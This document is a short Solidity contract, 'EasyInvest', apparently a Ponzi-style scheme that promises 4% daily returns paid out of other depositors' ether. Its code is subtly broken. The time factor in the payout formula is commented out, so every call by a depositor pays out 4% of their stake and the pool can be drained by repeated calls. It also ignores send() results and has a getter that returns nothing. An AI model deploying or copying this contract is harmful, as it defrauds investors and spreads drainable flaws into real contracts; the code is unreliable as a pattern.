pragma solidity ^0.4.24;
contract EasyInvest {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 4 / 100;// * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }

    function max(uint256 v) public pure returns(uint256){
       return  v * 4 / 100 ;
    }

    function blocknumber(address addr) public view returns(uint256){
       atBlock[addr];
    }

    function fund(address addr) public view returns(uint256){
       return invested[addr];
    }
    
    function dayfund(address addr) public view returns(uint256){
       return invested[addr] * 4 / 100 ;
    }
}